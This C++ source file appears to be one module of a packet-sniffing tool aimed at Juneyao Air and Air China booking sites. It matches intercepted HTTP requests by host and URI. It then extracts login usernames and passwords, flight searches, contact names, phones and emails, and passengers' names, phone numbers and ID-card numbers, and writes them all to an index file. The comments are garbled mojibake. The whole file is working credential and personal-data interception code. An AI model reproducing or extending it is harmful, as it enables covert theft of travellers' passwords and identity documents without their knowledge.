
#include "StdAfx.h"
#include "PlaneJuneYaoAir.h"

plane::PlaneJuneYaoAir::PlaneJuneYaoAir(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::PlaneJuneYaoAir::~PlaneJuneYaoAir()
{
	
}
		
// NI ���֤��PP ���գ�CC ����
string plane::PlaneJuneYaoAir::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "NI"){idTypeTrue = "���֤";}
	if (idType == "PP"){idTypeTrue = "����";}
	if (idType == "CC"){idTypeTrue = "����";}
	return idTypeTrue;
}

int plane::PlaneJuneYaoAir::IsPlaneJuneYaoAir(HttpSession *http_session)
{
	//��¼
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/ReservationLogin.do")!=-1)) 
	{										
		return kpclogin;
	}	
	//��ѯ --���������
	if((http_session->m_Requestline.m_Host.Find("beacon.tingyun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/xhr?")!=-1)) 
	{										
		return kpcticket;
	}		
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("www.juneyaoair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pages/Flight/flight_confirm.aspx")!=-1) )   
	{
		return kpcorder;
	}
	//�ύ���� ����
	if((http_session->m_Requestline.m_Host.Find("www.juneyaoair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pages/Flight/flight_confirm_Int.aspx")!=-1) )  
	{
		return kpcorderint;
	}
	return 0;
}

int plane::PlaneJuneYaoAir::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//��ѯ 
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//�ύ����
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	//�ύ����
	if (action == kpcorderint)
	{
		return pcorderint(packet);
	}
	return 1;
}

//��¼
int plane::PlaneJuneYaoAir::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');

	//��¼����
	string usernameType = ms_->GetValueFromMapByKey("usernameType",true);
	//�˺�
	string username = ms_->GetValueFromMapByKey("username",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() && password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

//��ѯ ���� ����
int plane::PlaneJuneYaoAir::pcticket(const char *packet)
{	
	//��uri
	string uri = http_session_->m_Requestline.m_URI.GetBuffer(0);
	uri = ms_->UTF8ToGBK(UrlDecode(uri));
	ms_->Replace(uri,"?","&");
	ms_->SplitStringToMap(uri,'&','=');
	//���� ���� OW RT
	string flightType = ms_->GetValueFromMapByKey("flightType",true);
	//���� ���� N I
	string tripType = ms_->GetValueFromMapByKey("tripType",true);
	if (flightType == "OW")
	{
		//������
		string originLocation = ms_->GetValueFromMapByKey("sendCity",true);
		//Ŀ�ĵ�
		string destinationLocation = ms_->GetValueFromMapByKey("arrCity",true);
		//��������
		string departureDate = ms_->GetValueFromMapByKey("departureDate",true);
		output_text_ =
			"nick=" + 	originLocation + "\r\n" +		//������
			"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
			"servername=" +departureDate + "\r\n" +		//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (flightType == "RT")
	{
		//������
		string originLocation = ms_->GetValueFromMapByKey("sendCity",true);
		//Ŀ�ĵ�
		string destinationLocation = ms_->GetValueFromMapByKey("arrCity",true);
		//��������
		string departureDate = ms_->GetValueFromMapByKey("departureDate",true);
		//�������� 
		string departureDateRt = ms_->GetValueFromMapByKey("returnDate",true);
		
		output_text_ =
			"nick=" + 	originLocation + "\r\n" +		//������
			"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
			"servername=" + departureDate + "\r\n" +	//��������
			"appname=" + departureDateRt + "\r\n" +		//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	return 1;
}

//�ύ����
int plane::PlaneJuneYaoAir::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');

	//��ϵ����Ϣ
	string contactName,contactMobile,contackEmail;
	string linkuser = ms_->GetValueFromMapByKey("linkuser",true);
	//ʹ��json ��ȡ����
	Json::Reader readerLink;
	Json::Value valueLink;
	if (readerLink.parse(linkuser,valueLink))
	{	
		contactName = valueLink["Linker"].asString();
		contactMobile = valueLink["LinkerHandphone"].asString();
		contackEmail = valueLink["LinkerEMail"].asString();
	}	
	//�˿���Ϣ 
	string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
	string passengerInfo = ms_->GetValueFromMapByKey("passengerInfo",true);
	while(passengerInfo.find("IsBuyInsurance") != string::npos)
	{
		string passengerInfoTemp = passengerInfo.substr(0,passengerInfo.find("IsBuyInsurance") + strlen("IsBuyInsurance"));		
		//�˿�����
		passengerName = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"PassengerName\":\"","\",\"IsSaveCommon");
		//�˿͵绰
		passengerTel = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"HandphoneNo\":\"","\",\"AdtNameToInf");
		//�˿�֤������
	 	passengerIDtype = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"CertType\":\"","\",\"CertNo");
		passengerIDtype = GetIdType(passengerIDtype);
		//�˿�֤����
		passengerIDcard = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"CertNo\":\"","\",\"Birthdate");
		
		output_text_ =
			"mid=" + 	contactName + "\r\n" +		//��ϵ������
			"oid=" + 	contactMobile + "\r\n" +	//��ϵ�˵绰
			"imsi=" + 	contackEmail + "\r\n" +		//��ϵ������
			"msgtype=" + passengerName + "\r\n" +	//�˿�����
			"clientmsg=" + passengerTel + "\r\n" +	//�˿͵绰
			"webname=" + passengerIDtype + "\r\n" + //�˿�֤������
			"subject=" + passengerIDcard + "\r\n" + //�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
		passengerInfo = passengerInfo.substr(passengerInfo.find("IsBuyInsurance") + strlen("IsBuyInsurance"));
	}
	return 1;
}


//�ύ���� ����
int plane::PlaneJuneYaoAir::pcorderint(const char *packet)
{
	// 	//��cookie �л��user_
	// 	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	// 	cookie = ms_->UrlDecode(cookie);
	// //AfxMessageBox(cookie.c_str());
	// 	ms_->SplitStringToMap(cookie, ';','=');
	// 	//�˺�
	// 	string tmp = ms_->GetValueFromMapByKey("P_INFO");
	//     //������
	// 	//Ŀ�ĵ�
	
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	
	//��ϵ����Ϣ
	string contactName,contactMobile,contackEmail;
	string linkuser = ms_->GetValueFromMapByKey("linkuser",true);
	//ʹ��json ��ȡ����
	Json::Reader readerLink;
	Json::Value valueLink;
	if (readerLink.parse(linkuser,valueLink))
	{	
		contactName = valueLink["Linker"].asString();
		contactMobile = valueLink["LinkerHandphone"].asString();
		contackEmail = valueLink["LinkerEMail"].asString();
	}	
	//�˿���Ϣ 
	string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
	string passengerInfo = ms_->GetValueFromMapByKey("passengerInfo",true);
	while(passengerInfo.find("CNTax") != string::npos)
	{
		string passengerInfoTemp = passengerInfo.substr(0,passengerInfo.find("CNTax") + strlen("CNTax"));		
		//�˿�����
		passengerName = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"PassengerName\":\"","\",\"PassengerType");
		//�˿͵绰
		passengerTel = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"HandphoneNo\":\"","\",\"AdtNameToInf");
		//�˿�֤������
		passengerIDtype = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"CertType\":\"","\",\"CertNo");
		passengerIDtype = GetIdType(passengerIDtype);
		//�˿�֤����
		passengerIDcard = ms_->GetValueBetweenBeginEnd(passengerInfoTemp,"\"CertNo\":\"","\",\"Birthdate");
		
		output_text_ =
			"mid=" + 	contactName + "\r\n" +		//��ϵ������
			"oid=" + 	contactMobile + "\r\n" +	//��ϵ�˵绰
			"imsi=" + 	contackEmail + "\r\n" +		//��ϵ������
			"msgtype=" + passengerName + "\r\n" +	//�˿�����
			"clientmsg=" + passengerTel + "\r\n" +	//�˿͵绰
			"webname=" + passengerIDtype + "\r\n" + //�˿�֤������
			"subject=" + passengerIDcard + "\r\n" + //�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
		passengerInfo = passengerInfo.substr(passengerInfo.find("CNTax") + strlen("CNTax"));
	}
	return 1;
}